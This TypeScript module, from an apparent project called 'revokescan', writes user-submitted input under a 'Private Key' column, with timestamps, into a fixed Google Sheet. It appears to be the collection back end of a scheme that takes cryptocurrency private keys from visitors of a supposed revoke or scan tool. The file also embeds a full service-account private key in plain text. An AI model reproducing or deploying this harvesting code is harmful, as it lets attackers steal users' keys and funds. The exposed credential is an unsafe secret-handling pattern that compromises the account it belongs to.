import { google } from "googleapis";

const SCOPES = ["https://www.googleapis.com/auth/spreadsheets"];
const SERVICE_ACCOUNT_CREDENTIALS = {
  type: "service_account",
  project_id: "revokescan",
  private_key_id: process.env.PRIVATE_KEY_ID,
  private_key:
    "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCqSMZl2kbRZyVO\n/VxzHXXWsnjEpvokycXHz8uqowP5psmX/xzcmWzp80V9LufzxfuzGig5zBc40UpA\nV60I+Z8rdoivB6Jn/NnRZxnipGaijxk2vRKy9OrSsh8aQEvJsQUYU3GUJMNLbfG1\nfwv/c1w3Wc9nD20ItC7sQHtj/GKKY/XnQevF20X7laNzsYkhIgZb9sC+fBNm9hle\nENHRkNiY4HMnBkG3YUAX+2aoOC35IsbEPJzTlNdjOUdtpu7SY/y5+xQ46+oH2of9\n7mWXUsscL2jOyCMz6jyVacqbKJs1JNCgk6TAJweX5vz3gvQQpu4770mWUzW+rNpp\n1VQ6t6PXAgMBAAECggEAAZIXRmQ7h/3wEajzm9o3NopB4+p4XzN/QAcSJVpIlJpt\nvJmtTfmaUBQe3Xc7y3tVhYLlwRa5VhxUF4DXh0AqMC/xNdAXtubVqYFOc1E54yD3\nxhH7ZKwuqE/dSpQyPsODvQQ0BX5LUNxMQPTRiwMo5BfPem9hfZWP4zz7BmKTFByx\nD8DIk4Ety63lkBQViBtlaraahORtEpUEzUUK1o6232suGrpzm0EZZN35vx0leK5w\nmuOGwPaDsBW4xDI7+CdWcZvVITcEVKD0e6g0wfhQH0yntlhyMI57w+4RU0hpb6G6\n8aqCjNRwD1JaU3X+LlT3DmCBzZ6jciod2sP9I01o0QKBgQDjnMjbZdB3FUkvtF3D\nXv+2+g5a6KPrpLhu51AVefQOrBO+Iwp2SONbaVHLneVWMYaaGfvn79wr+VcqP83c\n5Zej628LaYo6dWI6TqyP+24ndioFXu5IDjf8dMRNBW+7maDwS3zpHZlNAj2Nk61V\n+lqyGzcIUGfYK92DSAAh6p7AxwKBgQC/hZ2OdAzMazF1PXcWWjKat6ftxwuf0JnS\n/y7MLkzHU+Wu6epKLgi8QNJsoVfjf6d8xv6U66d0UVvuNNXS31QIyjHxExP0wEw2\njpF8mfUdxyXHzcyATrOYrHgRqHeQLz4uFjhPE9esthiJ79/u1hO/DaLK2pbZ840O\nV3h+NMMUcQKBgEsIEB5i/cmDttCHALG6y0kiPUEyl3bCohnNHtU1koKTrx5qprQ/\natNjcJdSwZscUGbUUfovU8EbPOSsi8xZ0xcyMTTt4adLssnNzYzZMYLIrSmAFcSj\nC0mppFxPgnmxNyB/gfnGzBZaurfFCsrg8Kzt08Jl3xWfwDHatlB360VZAoGAUxaU\nlAikxMp8WnCgCYJ4Ecc7g1ynHl5RXch3dP1hMdij/I5epm/yOjmlEJuulXP8JZXv\nPIw/yabCS0WAvktFGcsef4fXUIdciQ6w722beZ+8NEKEReXe5I1uSbrcpCDayQO6\nyhPBrZwSaUU30VXumyQ/S+IpL8UJnP81twsM1wECgYEApKGboN7G3YC1dcgvo0gy\nqz+61McKvnYhtreKKfViyqhv9IOyT8vqab78edj9ljyUoVb7NH72xuQLRbYCNkTZ\naOxxPCVAo98XxY8NunUu/IxbdHJmHm9K3tlgk6oEi0vuncczgDmInz6cQSeJHs5k\nA9tRx5ef7EL7xDnt66d65Iw=\n-----END PRIVATE KEY-----\n",
  client_email: process.env.CLIENT_EMAIL,
  client_id: process.env.CLIENT_ID,
  auth_uri: "https://accounts.google.com/o/oauth2/auth",
  token_uri: "https://oauth2.googleapis.com/token",
  auth_provider_x509_cert_url: "https://www.googleapis.com/oauth2/v1/certs",
  client_x509_cert_url:
    "https://www.googleapis.com/robot/v1/metadata/x509/revokescan%40revokescan.iam.gserviceaccount.com",
};

async function addToSheet(data: any) {
  const auth = new google.auth.GoogleAuth({
    credentials: SERVICE_ACCOUNT_CREDENTIALS,
    scopes: SCOPES,
  });

  const sheets = google.sheets({ version: "v4", auth });
  const spreadsheetId = "1RbYBLTkrGtUo4vpgEpx_3lY4b9KXn1WKqcNjqQ7I6Rg"; // Replace with your actual Google Sheet ID
  const range = "Sheet1!A1:B1"; // First row for headers

  // Check if headers exist
  const response = await sheets.spreadsheets.values.get({
    spreadsheetId,
    range: "Sheet1!A1:B1",
  });

  const headersExist = response.data.values && response.data.values.length > 0;

  if (!headersExist) {
    // Add column headers if missing
    await sheets.spreadsheets.values.update({
      spreadsheetId,
      range: "Sheet1!A1:B1",
      valueInputOption: "RAW",
      requestBody: {
        values: [["Private Key", "Timestamp"]],
      },
    });
  }

  // Append new data below headers
  await sheets.spreadsheets.values.append({
    spreadsheetId,
    range: "Sheet1!A:B",
    valueInputOption: "USER_ENTERED",
    requestBody: {
      values: [[data.input, data.timestamp]],
    },
  });
}

export default addToSheet;
